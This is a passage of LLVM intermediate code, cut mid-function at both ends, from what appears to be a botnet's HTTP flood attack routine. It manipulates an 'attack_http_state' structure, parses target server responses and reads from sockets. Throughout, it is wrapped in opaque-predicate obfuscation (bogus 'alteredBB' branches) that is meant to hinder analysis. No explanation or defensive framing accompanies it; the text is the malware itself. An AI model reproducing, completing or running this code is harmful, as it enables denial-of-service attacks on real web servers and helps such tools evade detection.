  %3594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3593, i32 0, i32 18
  %3595 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3594, i32 0, i32 0
  %3596 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3596, i32 0, i32 17
  %3598 = load i32, i32* %3597, align 4
  %3599 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3600 = call i32 @util_memsearch(i8* %3595, i32 %3598, i8* %3599, i32 11)
  %3601 = icmp ne i32 %3600, -1
  br i1 %3601, label %3602, label %3750

; <label>:3602:                                   ; preds = %3592
  %3603 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3603, i32 0, i32 18
  %3605 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3604, i32 0, i32 0
  %3606 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3606, i32 0, i32 17
  %3608 = load i32, i32* %3607, align 4
  %3609 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3610 = call i32 @util_memsearch(i8* %3605, i32 %3608, i8* %3609, i32 11)
  store i32 %3610, i32* %68, align 4
  %3611 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3611, i32 0, i32 18
  %3613 = load i32, i32* %68, align 4
  %3614 = sext i32 %3613 to i64
  %3615 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3612, i64 0, i64 %3614
  %3616 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3616, i32 0, i32 17
  %3618 = load i32, i32* %3617, align 4
  %3619 = load i32, i32* %68, align 4
  %3620 = sub nsw i32 %3618, %3619
  %3621 = call i32 @util_memsearch(i8* %3615, i32 %3620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3621, i32* %69, align 4
  %3622 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3623 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3622, i32 0, i32 18
  %3624 = load i32, i32* %68, align 4
  %3625 = load i32, i32* %69, align 4
  %3626 = sub nsw i32 %3625, 1
  %3627 = add nsw i32 %3624, %3626
  %3628 = sext i32 %3627 to i64
  %3629 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3623, i64 0, i64 %3628
  store i8 0, i8* %3629, align 1
  %3630 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3630, i32 0, i32 15
  %3632 = load i32, i32* %3631, align 4
  %3633 = icmp slt i32 %3632, 5
  br i1 %3633, label %3634, label %3745

; <label>:3634:                                   ; preds = %3602
  %3635 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3635, i32 0, i32 18
  %3637 = load i32, i32* %68, align 4
  %3638 = sext i32 %3637 to i64
  %3639 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3636, i64 0, i64 %3638
  %3640 = call i32 @util_strlen(i8* %3639)
  %3641 = icmp slt i32 %3640, 128
  br i1 %3641, label %3642, label %3745

; <label>:3642:                                   ; preds = %3634
  %3643 = load i32, i32* @x.17
  %3644 = load i32, i32* @y.18
  %3645 = sub i32 %3643, 1
  %3646 = mul i32 %3643, %3645
  %3647 = urem i32 %3646, 2
  %3648 = icmp eq i32 %3647, 0
  %3649 = icmp slt i32 %3644, 10
  %3650 = or i1 %3648, %3649
  br i1 %3650, label %originalBB693, label %originalBB693alteredBB

originalBB693:                                    ; preds = %originalBB693alteredBB, %3642
  %3651 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3652 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3651, i32 0, i32 16
  %3653 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3653, i32 0, i32 15
  %3655 = load i32, i32* %3654, align 4
  %3656 = sext i32 %3655 to i64
  %3657 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3652, i64 0, i64 %3656
  %3658 = getelementptr inbounds [128 x i8], [128 x i8]* %3657, i32 0, i32 0
  %3659 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3659, i32 0, i32 18
  %3661 = load i32, i32* %68, align 4
  %3662 = sext i32 %3661 to i64
  %3663 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3660, i64 0, i64 %3662
  %3664 = call i32 @util_strcpy(i8* %3658, i8* %3663)
  %3665 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3665, i32 0, i32 16
  %3667 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3667, i32 0, i32 15
  %3669 = load i32, i32* %3668, align 4
  %3670 = sext i32 %3669 to i64
  %3671 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3666, i64 0, i64 %3670
  %3672 = getelementptr inbounds [128 x i8], [128 x i8]* %3671, i32 0, i32 0
  %3673 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3674 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3673, i32 0, i32 16
  %3675 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3676 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3675, i32 0, i32 15
  %3677 = load i32, i32* %3676, align 4
  %3678 = sext i32 %3677 to i64
  %3679 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3674, i64 0, i64 %3678
  %3680 = getelementptr inbounds [128 x i8], [128 x i8]* %3679, i32 0, i32 0
  %3681 = call i32 @util_strlen(i8* %3680)
  %3682 = sext i32 %3681 to i64
  %3683 = getelementptr inbounds i8, i8* %3672, i64 %3682
  %3684 = call i32 @util_strcpy(i8* %3683, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3685 = load i32, i32* %69, align 4
  %3686 = add nsw i32 %3685, 3
  %3687 = load i32, i32* %68, align 4
  %3688 = add nsw i32 %3687, %3686
  store i32 %3688, i32* %68, align 4
  %3689 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3689, i32 0, i32 18
  %3691 = load i32, i32* %68, align 4
  %3692 = sext i32 %3691 to i64
  %3693 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3690, i64 0, i64 %3692
  %3694 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3694, i32 0, i32 17
  %3696 = load i32, i32* %3695, align 4
  %3697 = load i32, i32* %68, align 4
  %3698 = sub nsw i32 %3696, %3697
  %3699 = call i32 @util_memsearch(i8* %3693, i32 %3698, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3699, i32* %69, align 4
  %3700 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3700, i32 0, i32 18
  %3702 = load i32, i32* %68, align 4
  %3703 = load i32, i32* %69, align 4
  %3704 = sub nsw i32 %3703, 1
  %3705 = add nsw i32 %3702, %3704
  %3706 = sext i32 %3705 to i64
  %3707 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3701, i64 0, i64 %3706
  store i8 0, i8* %3707, align 1
  %3708 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3708, i32 0, i32 16
  %3710 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3711 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3710, i32 0, i32 15
  %3712 = load i32, i32* %3711, align 4
  %3713 = sext i32 %3712 to i64
  %3714 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3709, i64 0, i64 %3713
  %3715 = getelementptr inbounds [128 x i8], [128 x i8]* %3714, i32 0, i32 0
  %3716 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3716, i32 0, i32 16
  %3718 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3719 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3718, i32 0, i32 15
  %3720 = load i32, i32* %3719, align 4
  %3721 = sext i32 %3720 to i64
  %3722 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3717, i64 0, i64 %3721
  %3723 = getelementptr inbounds [128 x i8], [128 x i8]* %3722, i32 0, i32 0
  %3724 = call i32 @util_strlen(i8* %3723)
  %3725 = sext i32 %3724 to i64
  %3726 = getelementptr inbounds i8, i8* %3715, i64 %3725
  %3727 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3728 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3727, i32 0, i32 18
  %3729 = load i32, i32* %68, align 4
  %3730 = sext i32 %3729 to i64
  %3731 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3728, i64 0, i64 %3730
  %3732 = call i32 @util_strcpy(i8* %3726, i8* %3731)
  %3733 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3734 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3733, i32 0, i32 15
  %3735 = load i32, i32* %3734, align 4
  %3736 = add nsw i32 %3735, 1
  store i32 %3736, i32* %3734, align 4
  %3737 = load i32, i32* @x.17
  %3738 = load i32, i32* @y.18
  %3739 = sub i32 %3737, 1
  %3740 = mul i32 %3737, %3739
  %3741 = urem i32 %3740, 2
  %3742 = icmp eq i32 %3741, 0
  %3743 = icmp slt i32 %3738, 10
  %3744 = or i1 %3742, %3743
  br i1 %3744, label %originalBBpart2719, label %originalBB693alteredBB

originalBBpart2719:                               ; preds = %originalBB693
  br label %3745

; <label>:3745:                                   ; preds = %originalBBpart2719, %3634, %3602
  %3746 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3746, i32 0, i32 14
  store i32 -1, i32* %3747, align 4
  %3748 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3748, i32 0, i32 1
  store i8 10, i8* %3749, align 4
  br label %3984

; <label>:3750:                                   ; preds = %3592
  br label %3751

; <label>:3751:                                   ; preds = %3750, %originalBBpart2691
  br label %3752

; <label>:3752:                                   ; preds = %3751, %originalBBpart2687
  %3753 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3754 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3753, i32 0, i32 14
  %3755 = load i32, i32* %3754, align 4
  %3756 = icmp eq i32 %3755, 0
  br i1 %3756, label %3757, label %3915

; <label>:3757:                                   ; preds = %3752
  %3758 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3758, i32 0, i32 13
  %3760 = load i32, i32* %3759, align 4
  %3761 = icmp eq i32 %3760, 1
  br i1 %3761, label %3762, label %3898

; <label>:3762:                                   ; preds = %3757
  %3763 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3764 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3763, i32 0, i32 18
  %3765 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3764, i32 0, i32 0
  %3766 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3766, i32 0, i32 17
  %3768 = load i32, i32* %3767, align 4
  %3769 = call i32 @util_memsearch(i8* %3765, i32 %3768, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %3770 = icmp ne i32 %3769, -1
  br i1 %3770, label %3771, label %3881

; <label>:3771:                                   ; preds = %3762
  %3772 = load i32, i32* @x.17
  %3773 = load i32, i32* @y.18
  %3774 = sub i32 %3772, 1
  %3775 = mul i32 %3772, %3774
  %3776 = urem i32 %3775, 2
  %3777 = icmp eq i32 %3776, 0
  %3778 = icmp slt i32 %3773, 10
  %3779 = or i1 %3777, %3778
  br i1 %3779, label %originalBB721, label %originalBB721alteredBB

originalBB721:                                    ; preds = %originalBB721alteredBB, %3771
  %3780 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3781 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3780, i32 0, i32 18
  %3782 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3781, i32 0, i32 0
  %3783 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3783, i32 0, i32 17
  %3785 = load i32, i32* %3784, align 4
  %3786 = call i32 @util_memsearch(i8* %3782, i32 %3785, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %3786, i32* %70, align 4
  %3787 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3788 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3787, i32 0, i32 18
  %3789 = load i32, i32* %70, align 4
  %3790 = sub nsw i32 %3789, 2
  %3791 = sext i32 %3790 to i64
  %3792 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3788, i64 0, i64 %3791
  store i8 0, i8* %3792, align 1
  %3793 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3794 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3793, i32 0, i32 18
  %3795 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3794, i32 0, i32 0
  %3796 = load i32, i32* %70, align 4
  %3797 = call i32 @util_memsearch(i8* %3795, i32 %3796, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3798 = icmp ne i32 %3797, -1
  %3799 = load i32, i32* @x.17
  %3800 = load i32, i32* @y.18
  %3801 = sub i32 %3799, 1
  %3802 = mul i32 %3799, %3801
  %3803 = urem i32 %3802, 2
  %3804 = icmp eq i32 %3803, 0
  %3805 = icmp slt i32 %3800, 10
  %3806 = or i1 %3804, %3805
  br i1 %3806, label %originalBBpart2737, label %originalBB721alteredBB

originalBBpart2737:                               ; preds = %originalBB721
  br i1 %3798, label %3807, label %3833

; <label>:3807:                                   ; preds = %originalBBpart2737
  %3808 = load i32, i32* @x.17
  %3809 = load i32, i32* @y.18
  %3810 = sub i32 %3808, 1
  %3811 = mul i32 %3808, %3810
  %3812 = urem i32 %3811, 2
  %3813 = icmp eq i32 %3812, 0
  %3814 = icmp slt i32 %3809, 10
  %3815 = or i1 %3813, %3814
  br i1 %3815, label %originalBB739, label %originalBB739alteredBB

originalBB739:                                    ; preds = %originalBB739alteredBB, %3807
  %3816 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3817 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3816, i32 0, i32 18
  %3818 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3818, i32 0, i32 18
  %3820 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3819, i32 0, i32 0
  %3821 = load i32, i32* %70, align 4
  %3822 = call i32 @util_memsearch(i8* %3820, i32 %3821, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3823 = sext i32 %3822 to i64
  %3824 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3817, i64 0, i64 %3823
  store i8 0, i8* %3824, align 1
  %3825 = load i32, i32* @x.17
  %3826 = load i32, i32* @y.18
  %3827 = sub i32 %3825, 1
  %3828 = mul i32 %3825, %3827
  %3829 = urem i32 %3828, 2
  %3830 = icmp eq i32 %3829, 0
  %3831 = icmp slt i32 %3826, 10
  %3832 = or i1 %3830, %3831
  br i1 %3832, label %originalBBpart2741, label %originalBB739alteredBB

originalBBpart2741:                               ; preds = %originalBB739
  br label %3833

; <label>:3833:                                   ; preds = %originalBBpart2741, %originalBBpart2737
  %3834 = load i32, i32* @x.17
  %3835 = load i32, i32* @y.18
  %3836 = sub i32 %3834, 1
  %3837 = mul i32 %3834, %3836
  %3838 = urem i32 %3837, 2
  %3839 = icmp eq i32 %3838, 0
  %3840 = icmp slt i32 %3835, 10
  %3841 = or i1 %3839, %3840
  br i1 %3841, label %originalBB743, label %originalBB743alteredBB

originalBB743:                                    ; preds = %originalBB743alteredBB, %3833
  %3842 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3842, i32 0, i32 18
  %3844 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3843, i32 0, i32 0
  %3845 = call i32 @util_atoi(i8* %3844, i32 16)
  store i32 %3845, i32* %71, align 4
  %3846 = load i32, i32* %71, align 4
  %3847 = icmp eq i32 %3846, 0
  %3848 = load i32, i32* @x.17
  %3849 = load i32, i32* @y.18
  %3850 = sub i32 %3848, 1
  %3851 = mul i32 %3848, %3850
  %3852 = urem i32 %3851, 2
  %3853 = icmp eq i32 %3852, 0
  %3854 = icmp slt i32 %3849, 10
  %3855 = or i1 %3853, %3854
  br i1 %3855, label %originalBBpart2745, label %originalBB743alteredBB

originalBBpart2745:                               ; preds = %originalBB743
  br i1 %3847, label %3856, label %3875

; <label>:3856:                                   ; preds = %originalBBpart2745
  %3857 = load i32, i32* @x.17
  %3858 = load i32, i32* @y.18
  %3859 = sub i32 %3857, 1
  %3860 = mul i32 %3857, %3859
  %3861 = urem i32 %3860, 2
  %3862 = icmp eq i32 %3861, 0
  %3863 = icmp slt i32 %3858, 10
  %3864 = or i1 %3862, %3863
  br i1 %3864, label %originalBB747, label %originalBB747alteredBB

originalBB747:                                    ; preds = %originalBB747alteredBB, %3856
  %3865 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3865, i32 0, i32 1
  store i8 1, i8* %3866, align 4
  %3867 = load i32, i32* @x.17
  %3868 = load i32, i32* @y.18
  %3869 = sub i32 %3867, 1
  %3870 = mul i32 %3867, %3869
  %3871 = urem i32 %3870, 2
  %3872 = icmp eq i32 %3871, 0
  %3873 = icmp slt i32 %3868, 10
  %3874 = or i1 %3872, %3873
  br i1 %3874, label %originalBBpart2749, label %originalBB747alteredBB

originalBBpart2749:                               ; preds = %originalBB747
  br label %3984

; <label>:3875:                                   ; preds = %originalBBpart2745
  %3876 = load i32, i32* %71, align 4
  %3877 = add nsw i32 %3876, 2
  %3878 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3878, i32 0, i32 14
  store i32 %3877, i32* %3879, align 4
  %3880 = load i32, i32* %70, align 4
  store i32 %3880, i32* %67, align 4
  br label %3881

; <label>:3881:                                   ; preds = %3875, %3762
  %3882 = load i32, i32* @x.17
  %3883 = load i32, i32* @y.18
  %3884 = sub i32 %3882, 1
  %3885 = mul i32 %3882, %3884
  %3886 = urem i32 %3885, 2
  %3887 = icmp eq i32 %3886, 0
  %3888 = icmp slt i32 %3883, 10
  %3889 = or i1 %3887, %3888
  br i1 %3889, label %originalBB751, label %originalBB751alteredBB

originalBB751:                                    ; preds = %originalBB751alteredBB, %3881
  %3890 = load i32, i32* @x.17
  %3891 = load i32, i32* @y.18
  %3892 = sub i32 %3890, 1
  %3893 = mul i32 %3890, %3892
  %3894 = urem i32 %3893, 2
  %3895 = icmp eq i32 %3894, 0
  %3896 = icmp slt i32 %3891, 10
  %3897 = or i1 %3895, %3896
  br i1 %3897, label %originalBBpart2753, label %originalBB751alteredBB

originalBBpart2753:                               ; preds = %originalBB751
  br label %3914

; <label>:3898:                                   ; preds = %3757
  %3899 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3899, i32 0, i32 17
  %3901 = load i32, i32* %3900, align 4
  %3902 = load i32, i32* %67, align 4
  %3903 = sub nsw i32 %3901, %3902
  %3904 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3905 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3904, i32 0, i32 14
  store i32 %3903, i32* %3905, align 4
  %3906 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3907 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3906, i32 0, i32 14
  %3908 = load i32, i32* %3907, align 4
  %3909 = icmp eq i32 %3908, 0
  br i1 %3909, label %3910, label %3913

; <label>:3910:                                   ; preds = %3898
  %3911 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3912 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3911, i32 0, i32 1
  store i8 1, i8* %3912, align 4
  br label %3984

; <label>:3913:                                   ; preds = %3898
  br label %3914

; <label>:3914:                                   ; preds = %3913, %originalBBpart2753
  br label %3915

; <label>:3915:                                   ; preds = %3914, %3752
  %3916 = load i32, i32* @x.17
  %3917 = load i32, i32* @y.18
  %3918 = sub i32 %3916, 1
  %3919 = mul i32 %3916, %3918
  %3920 = urem i32 %3919, 2
  %3921 = icmp eq i32 %3920, 0
  %3922 = icmp slt i32 %3917, 10
  %3923 = or i1 %3921, %3922
  br i1 %3923, label %originalBB755, label %originalBB755alteredBB

originalBB755:                                    ; preds = %originalBB755alteredBB, %3915
  %3924 = load i32, i32* %67, align 4
  %3925 = icmp eq i32 %3924, 0
  %3926 = load i32, i32* @x.17
  %3927 = load i32, i32* @y.18
  %3928 = sub i32 %3926, 1
  %3929 = mul i32 %3926, %3928
  %3930 = urem i32 %3929, 2
  %3931 = icmp eq i32 %3930, 0
  %3932 = icmp slt i32 %3927, 10
  %3933 = or i1 %3931, %3932
  br i1 %3933, label %originalBBpart2757, label %originalBB755alteredBB

originalBBpart2757:                               ; preds = %originalBB755
  br i1 %3925, label %3934, label %3951

; <label>:3934:                                   ; preds = %originalBBpart2757
  %3935 = load i32, i32* @x.17
  %3936 = load i32, i32* @y.18
  %3937 = sub i32 %3935, 1
  %3938 = mul i32 %3935, %3937
  %3939 = urem i32 %3938, 2
  %3940 = icmp eq i32 %3939, 0
  %3941 = icmp slt i32 %3936, 10
  %3942 = or i1 %3940, %3941
  br i1 %3942, label %originalBB759, label %originalBB759alteredBB

originalBB759:                                    ; preds = %originalBB759alteredBB, %3934
  %3943 = load i32, i32* @x.17
  %3944 = load i32, i32* @y.18
  %3945 = sub i32 %3943, 1
  %3946 = mul i32 %3943, %3945
  %3947 = urem i32 %3946, 2
  %3948 = icmp eq i32 %3947, 0
  %3949 = icmp slt i32 %3944, 10
  %3950 = or i1 %3948, %3949
  br i1 %3950, label %originalBBpart2761, label %originalBB759alteredBB

originalBBpart2761:                               ; preds = %originalBB759
  br label %3984

; <label>:3951:                                   ; preds = %originalBBpart2757
  %3952 = load i32, i32* %67, align 4
  %3953 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3953, i32 0, i32 17
  %3955 = load i32, i32* %3954, align 4
  %3956 = sub nsw i32 %3955, %3952
  store i32 %3956, i32* %3954, align 4
  %3957 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3957, i32 0, i32 18
  %3959 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3958, i32 0, i32 0
  %3960 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3960, i32 0, i32 18
  %3962 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3961, i32 0, i32 0
  %3963 = load i32, i32* %67, align 4
  %3964 = sext i32 %3963 to i64
  %3965 = getelementptr inbounds i8, i8* %3962, i64 %3964
  %3966 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3967 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3966, i32 0, i32 17
  %3968 = load i32, i32* %3967, align 4
  %3969 = sext i32 %3968 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3959, i8* %3965, i64 %3969, i32 1, i1 false)
  %3970 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3971 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3970, i32 0, i32 18
  %3972 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3973 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3972, i32 0, i32 17
  %3974 = load i32, i32* %3973, align 4
  %3975 = sext i32 %3974 to i64
  %3976 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3971, i64 0, i64 %3975
  store i8 0, i8* %3976, align 1
  %3977 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3977, i32 0, i32 17
  %3979 = load i32, i32* %3978, align 4
  %3980 = icmp eq i32 %3979, 0
  br i1 %3980, label %3981, label %3982

; <label>:3981:                                   ; preds = %3951
  br label %3984

; <label>:3982:                                   ; preds = %3951
  br label %3983

; <label>:3983:                                   ; preds = %3982
  br label %3528

; <label>:3984:                                   ; preds = %3981, %originalBBpart2761, %3910, %originalBBpart2749, %3745
  br label %3418

; <label>:3985:                                   ; preds = %3518, %3440
  %3986 = load i32, i32* @x.17
  %3987 = load i32, i32* @y.18
  %3988 = sub i32 %3986, 1
  %3989 = mul i32 %3986, %3988
  %3990 = urem i32 %3989, 2
  %3991 = icmp eq i32 %3990, 0
  %3992 = icmp slt i32 %3987, 10
  %3993 = or i1 %3991, %3992
  br i1 %3993, label %originalBB763, label %originalBB763alteredBB

originalBB763:                                    ; preds = %originalBB763alteredBB, %3985
  %3994 = load i32, i32* @x.17
  %3995 = load i32, i32* @y.18
  %3996 = sub i32 %3994, 1
  %3997 = mul i32 %3994, %3996
  %3998 = urem i32 %3997, 2
  %3999 = icmp eq i32 %3998, 0
  %4000 = icmp slt i32 %3995, 10
  %4001 = or i1 %3999, %4000
  br i1 %4001, label %originalBBpart2765, label %originalBB763alteredBB

originalBBpart2765:                               ; preds = %originalBB763
  br label %4118

; <label>:4002:                                   ; preds = %3411
  %4003 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4004 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4003, i32 0, i32 1
  %4005 = load i8, i8* %4004, align 4
  %4006 = zext i8 %4005 to i32
  %4007 = icmp eq i32 %4006, 10
  br i1 %4007, label %4008, label %4101

; <label>:4008:                                   ; preds = %4002
  br label %4009

; <label>:4009:                                   ; preds = %4074, %4008
  %4010 = call i32* @__errno_location() #7
  store i32 0, i32* %4010, align 4
  %4011 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4011, i32 0, i32 0
  %4013 = load i32, i32* %4012, align 4
  %4014 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4015 = call i64 @recv(i32 %4013, i8* %4014, i64 10240, i32 16384)
  %4016 = trunc i64 %4015 to i32
  store i32 %4016, i32* %20, align 4
  %4017 = load i32, i32* %20, align 4
  %4018 = icmp eq i32 %4017, 0
  br i1 %4018, label %4019, label %4037

; <label>:4019:                                   ; preds = %4009
  %4020 = load i32, i32* @x.17
  %4021 = load i32, i32* @y.18
  %4022 = sub i32 %4020, 1
  %4023 = mul i32 %4020, %4022
  %4024 = urem i32 %4023, 2
  %4025 = icmp eq i32 %4024, 0
  %4026 = icmp slt i32 %4021, 10
  %4027 = or i1 %4025, %4026
  br i1 %4027, label %originalBB767, label %originalBB767alteredBB

originalBB767:                                    ; preds = %originalBB767alteredBB, %4019
  %4028 = call i32* @__errno_location() #7
  store i32 104, i32* %4028, align 4
  store i32 -1, i32* %20, align 4
  %4029 = load i32, i32* @x.17
  %4030 = load i32, i32* @y.18
  %4031 = sub i32 %4029, 1
  %4032 = mul i32 %4029, %4031
  %4033 = urem i32 %4032, 2
  %4034 = icmp eq i32 %4033, 0
  %4035 = icmp slt i32 %4030, 10
  %4036 = or i1 %4034, %4035
  br i1 %4036, label %originalBBpart2769, label %originalBB767alteredBB

originalBBpart2769:                               ; preds = %originalBB767
  br label %4037

; <label>:4037:                                   ; preds = %originalBBpart2769, %4009
  %4038 = load i32, i32* %20, align 4
  %4039 = icmp eq i32 %4038, -1
  br i1 %4039, label %4040, label %4074

; <label>:4040:                                   ; preds = %4037
  %4041 = call i32* @__errno_location() #7
